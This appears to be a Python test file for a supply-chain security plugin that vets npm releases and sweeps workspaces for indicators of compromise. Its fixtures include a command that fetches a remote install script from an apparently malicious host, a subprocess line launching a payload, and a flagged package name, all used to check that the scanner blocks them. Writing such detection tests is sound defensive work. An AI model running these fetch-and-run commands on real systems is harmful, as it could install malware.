import json
import sys
import tempfile
import unittest
from pathlib import Path
from unittest import mock


REPO_ROOT = Path(__file__).resolve().parents[1]
PLUGIN_ROOT = REPO_ROOT / "plugins" / "pounce"
SCRIPTS_ROOT = PLUGIN_ROOT / "scripts"
if str(SCRIPTS_ROOT) not in sys.path:
    sys.path.insert(0, str(SCRIPTS_ROOT))

from pounce_runtime import (  # noqa: E402
    VerificationUnavailable,
    agents_block_text,
    check_npm_release,
    extract_dependency_commands,
    replace_managed_block,
    vet_payload,
)


class PounceRuntimeTests(unittest.TestCase):
    def test_exact_ioc_match_blocks(self) -> None:
        result = vet_payload(
            {
                "mode": "release",
                "ecosystem": "npm",
                "package_name": "plain-crypto-js",
                "version": "4.2.1",
            },
            PLUGIN_ROOT,
        )
        self.assertEqual(result["verdict"], "block")
        self.assertTrue(any(item["signal_name"] == "exact_ioc_match" for item in result["findings"]))

    def test_artifact_ioc_match_blocks(self) -> None:
        result = vet_payload(
            {
                "mode": "release",
                "artifacts": ["curl https://sfrclak.com/install.sh"],
            },
            PLUGIN_ROOT,
        )
        self.assertEqual(result["verdict"], "block")
        self.assertTrue(any(item["signal_name"] == "artifact_ioc_match" for item in result["findings"]))

    def test_install_time_mechanism_blocks(self) -> None:
        result = vet_payload(
            {
                "mode": "release",
                "artifacts": ["subprocess.Popen(['python', 'payload.py'])"],
            },
            PLUGIN_ROOT,
        )
        self.assertEqual(result["verdict"], "block")
        self.assertTrue(any(item["category"] == "mechanism" for item in result["findings"]))

    def test_managed_block_replace_is_idempotent(self) -> None:
        existing = "# Workspace Policy\n\nUser-owned guidance.\n"
        first = replace_managed_block(existing, agents_block_text())
        second = replace_managed_block(first, agents_block_text())
        self.assertEqual(first, second)
        self.assertIn("User-owned guidance.", second)
        self.assertEqual(second.count("BEGIN POUNCE MANAGED BLOCK"), 1)

    def test_dependency_command_parser_handles_exact_specs(self) -> None:
        result = extract_dependency_commands("npm install axios@1.14.1 @scope/demo@2.0.0")
        self.assertEqual(len(result), 2)
        self.assertEqual(result[0].name, "axios")
        self.assertEqual(result[0].version, "1.14.1")
        self.assertEqual(result[1].name, "@scope/demo")
        self.assertEqual(result[1].version, "2.0.0")

    def test_npm_provenance_regression_warns_only_when_baseline_had_attestations(self) -> None:
        package_index = {
            "versions": {
                "1.0.0": {"dist": {"attestations": {"url": "https://example.test/attest"}}},
                "1.1.0": {"dist": {}},
            },
            "time": {
                "1.0.0": "2026-01-01T00:00:00Z",
                "1.1.0": "2026-01-10T00:00:00Z",
            },
        }
        with mock.patch("pounce_runtime.fetch_json", return_value=package_index):
            findings = check_npm_release("demo", "1.1.0")
        signal_names = {finding["signal_name"] for finding in findings}
        self.assertIn("npm_provenance_regression", signal_names)

    def test_npm_missing_attestations_without_regression_is_silent(self) -> None:
        package_index = {
            "versions": {
                "1.0.0": {"dist": {}},
                "1.1.0": {"dist": {}},
            },
            "time": {
                "1.0.0": "2026-01-01T00:00:00Z",
                "1.1.0": "2026-01-10T00:00:00Z",
            },
        }
        with mock.patch("pounce_runtime.fetch_json", return_value=package_index):
            findings = check_npm_release("demo", "1.1.0")
        signal_names = {finding["signal_name"] for finding in findings}
        self.assertNotIn("npm_provenance_regression", signal_names)

    def test_workspace_baseline_version_beats_registry_previous_release(self) -> None:
        package_index = {
            "versions": {
                "1.0.0": {"dist": {}, "dependencies": {}},
                "1.5.0": {"dist": {}, "dependencies": {}},
                "2.0.0": {"dist": {}, "dependencies": {"newdep": "^1.0.0"}},
            },
            "time": {
                "1.0.0": "2026-01-01T00:00:00Z",
                "1.5.0": "2026-02-01T00:00:00Z",
                "2.0.0": "2026-03-01T00:00:00Z",
            },
        }
        with tempfile.TemporaryDirectory() as tmpdir:
            workspace = Path(tmpdir)
            (workspace / "package-lock.json").write_text(
                json.dumps(
                    {
                        "name": "fixture",
                        "lockfileVersion": 3,
                        "packages": {
                            "": {"name": "fixture", "version": "1.0.0"},
                            "node_modules/demo": {"version": "1.0.0"},
                        },
                    }
                ),
                encoding="utf-8",
            )
            with (
                mock.patch("pounce_runtime.fetch_json", return_value=package_index),
                mock.patch(
                    "pounce_runtime.collect_npm_dependency_graph",
                    side_effect=[(set(), set()), (set(), set())],
                ),
            ):
                findings = check_npm_release("demo", "2.0.0", workspace)
        churn_finding = next(finding for finding in findings if finding["signal_name"] == "workspace_dependency_churn")
        self.assertIn("baseline 1.0.0 from workspace_lockfile", churn_finding["evidence"])

    def test_transitive_analysis_unavailable_warns_explicitly(self) -> None:
        package_index = {
            "versions": {
                "1.0.0": {"dist": {}, "dependencies": {}},
                "2.0.0": {"dist": {}, "dependencies": {}},
            },
            "time": {
                "1.0.0": "2026-01-01T00:00:00Z",
                "2.0.0": "2026-03-01T00:00:00Z",
            },
        }
        with mock.patch("pounce_runtime.fetch_json", return_value=package_index), mock.patch(
            "pounce_runtime.collect_npm_dependency_graph",
            side_effect=VerificationUnavailable("npm CLI was not available for transitive dependency analysis."),
        ):
            findings = check_npm_release("demo", "2.0.0")
        self.assertTrue(any(finding["signal_name"] == "transitive_analysis_unavailable" for finding in findings))

    def test_sweep_scans_log_files_for_ioc_strings(self) -> None:
        with tempfile.TemporaryDirectory() as tmpdir:
            workspace = Path(tmpdir)
            (workspace / "incident.log").write_text(
                "curl https://sfrclak.com/install.sh\n",
                encoding="utf-8",
            )
            result = vet_payload({"mode": "sweep", "workspace": str(workspace)}, PLUGIN_ROOT)
        self.assertEqual(result["verdict"], "block")
        self.assertTrue(any("incident.log" in finding["evidence"] for finding in result["findings"]))

    def test_sweep_truncation_warns(self) -> None:
        with tempfile.TemporaryDirectory() as tmpdir:
            workspace = Path(tmpdir)
            (workspace / "one.txt").write_text("safe\n", encoding="utf-8")
            (workspace / "two.txt").write_text("safe\n", encoding="utf-8")
            with mock.patch("pounce_runtime.MAX_SCAN_FILE_COUNT", 1):
                result = vet_payload({"mode": "sweep", "workspace": str(workspace)}, PLUGIN_ROOT)
        self.assertEqual(result["verdict"], "warn")
        self.assertTrue(any(finding["signal_name"] == "sweep_truncated" for finding in result["findings"]))


if __name__ == "__main__":
    unittest.main()
